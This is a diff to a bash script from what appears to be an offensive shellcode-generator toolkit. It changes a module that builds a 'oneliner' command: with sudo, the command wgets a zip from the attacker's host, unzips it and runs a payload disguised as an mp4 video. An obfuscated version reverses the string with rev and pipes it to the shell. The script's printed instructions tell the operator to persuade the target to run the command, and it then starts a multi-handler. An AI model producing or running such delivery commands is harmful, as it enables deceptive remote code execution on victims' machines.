@@ -8259,13 +8259,14 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
 
 if [ "$serv" = "multi-handler (default)" ]; then
 
-   original_string="sudo ./$mP4.mp4"
+   original_string="sudo ./$mP4.mp4";color="${RedF}"
    ## Read the next setting from venom-main setting file .
-   ovni=$(cat $IPATH/settings|grep -m 1 'FORCE_OBFUSC'|cut -d '=' -f2)
+   ovni=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
    if [ "$ovni" = "ON" ]; then
       xterm -T " Reversing Original String (oneliner)" -geometry 110x23 -e "rev <<< \"$original_string\" > /tmp/reverse.txt"
       reverse_original=`cat /tmp/reverse.txt`;rm /tmp/reverse.txt
       original_string="rev <<< \"$reverse_original\"|\$0"
+      color="${GreenF}"
    fi
 
    ## Print on terminal
@@ -8274,7 +8275,8 @@ if [ "$serv" = "multi-handler (default)" ]; then
    echo "-  That will remote download/exec (LAN) our mp4 video file and auto executes"
    echo "-  our C shellcode in an orphan process (deatch from mp4 video process)."
    echo "-  REMARK: All files required by this module have been ported to apache2."
-   echo "-";echo "-  ${YellowF}MANUAL_EXECUTION:"${Reset};
+   echo "-  REMARK: Edit settings file to turn [OBFUSCATION:ON]"
+   echo "-";echo "-  ${YellowF}MANUAL_EXECUTION: [OBFUSCATION:$color$ovni${YellowF}]"${Reset};
    echo "-  $original_string";echo "---"
    echo -n "[☠] Press any key to start a handler .."
    read odf
@@ -8290,13 +8292,14 @@ if [ "$serv" = "multi-handler (default)" ]; then
 else
 
    ## Reverse original string (venom attack vector)
-   original_string="sudo wget http://$lhost/$mP4.zip;unzip $mP4.zip;./$mP4.mp4"
+   original_string="sudo wget http://$lhost/$mP4.zip;unzip $mP4.zip;./$mP4.mp4";color="${RedF}"
    xterm -T " Reversing Original String (oneliner)" -geometry 110x23 -e "rev <<< \"$original_string\" > /tmp/reverse.txt"
    reverse_original=`cat /tmp/reverse.txt`;rm -f /tmp/reverse.txt
    ## Read the next setting from venom-main setting file .
-   ovni=$(cat $IPATH/settings|grep -m 1 'FORCE_OBFUSC'|cut -d '=' -f2)
+   ovni=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
    if [ "$ovni" = "ON" ]; then
       original_string="sudo wget http://$lhost/$mP4.zip;h=.;unzip $mP4.zip;\$h/$mP4.mp4"
+      color="${GreenF}"
    fi
    
    ## Print on terminal
@@ -8304,7 +8307,7 @@ else
    echo "-  Persuade the target to run the 'oneliner' OR the 'oneliner_obfuscated' command"
    echo "-  on their terminal. That will remote download/exec (LAN) our mp4 video file and"
    echo "-  auto executes our C shellcode in an orphan process (deatch from mp4 video process)."
-   echo "-";echo "-  ${YellowF}ONELINER:"${Reset};
+   echo "-";echo "-  ${YellowF}ONELINER: [OBFUSCATION:$color$ovni${YellowF}]"${Reset};
    echo "-  $original_string";echo "-"
    echo "-  ${YellowF}ONELINER_OBFUSCATED:"${Reset};
    echo "-  rev <<< \"$reverse_original\"|\$0"
